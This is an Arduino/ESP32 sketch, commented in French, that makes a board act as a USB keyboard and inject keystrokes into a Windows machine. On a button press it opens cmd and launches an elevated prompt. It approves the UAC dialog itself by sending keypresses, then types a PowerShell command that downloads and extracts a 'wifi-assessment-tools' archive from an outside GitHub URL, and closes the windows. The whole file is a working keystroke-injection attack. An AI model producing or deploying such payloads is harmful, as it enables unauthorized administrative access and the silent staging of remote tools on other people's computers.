#include "USB.h"
#include "USBHIDKeyboard.h"

USBHIDKeyboard Keyboard;

const int TRIGGER_PIN = 2;

void setup() {
  pinMode(TRIGGER_PIN, INPUT_PULLUP);
  USB.begin();
  Keyboard.begin(KeyboardLayout_fr_FR);
  
  delay(2000);
  
  // Attend l'appui sur le bouton
  while (digitalRead(TRIGGER_PIN) == HIGH) {
    delay(50);
  }
  delay(200); // anti-rebond
  
  runPayload();
}

void loop() {
  delay(1000);
}

void runPayload() {
  // === ÉTAPE 1: Ouvre Run dialog ===
  pressKey(KEY_LEFT_GUI, 'r', 1200); // Win + R
  
  // === ÉTAPE 2: Lance cmd ===
  Keyboard.print("cmd");
  delay(300);
  pressKey(KEY_RETURN, 800); // Attend que cmd s'ouvre
  
  // === ÉTAPE 3: Lance PowerShell avec UAC ===
  Keyboard.print("powershell Start-Process cmd -Verb RunAs");
  delay(300);
  pressKey(KEY_RETURN, 800);
  
  // === ÉTAPE 4: Le dialog UAC apparaît = attendre + cliquer Oui ===
  delay(800); // Laisse le temps au dialog d'apparaître
  Keyboard.press(KEY_LEFT_ARROW); // Focalise sur "Oui"
  delay(200);
  Keyboard.release(KEY_LEFT_ARROW);
  delay(300);
  pressKey(KEY_RETURN, 500); // Valide UAC
  
  // === ÉTAPE 5: Téléchargement (dans la nouvelle fenêtre cmd admin) ===
  delay(800); // Laisse cmd admin s'ouvrir
  
  Keyboard.print("powershell -Command \"Invoke-WebRequest -Uri 'https://github.com/Wiski-ai/wifi-assessment-tools/archive/refs/heads/Wifi.zip' -OutFile 'wifi-assessment-tools.zip'; Expand-Archive -Path 'wifi-assessment-tools.zip' -DestinationPath 'wifi-assessment-tools'\"");
  delay(300);
  pressKey(KEY_RETURN, 15000); // Attends le téléchargement
  
  // === ÉTAPE 6: Ferme ===
  Keyboard.print("exit");
  delay(200);
  pressKey(KEY_RETURN, 500);
  delay(500);
  Keyboard.print("exit");
  delay(200);
  pressKey(KEY_RETURN, 500);
}

// === Fonction helper ===
void pressKey(uint8_t key, uint16_t delayAfter) {
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
  delay(delayAfter);
}

void pressKey(uint8_t key1, uint8_t key2, uint16_t delayAfter) {
  Keyboard.press(key1);
  delay(50);
  Keyboard.press(key2);
  delay(50);
  Keyboard.releaseAll();
  delay(delayAfter);
}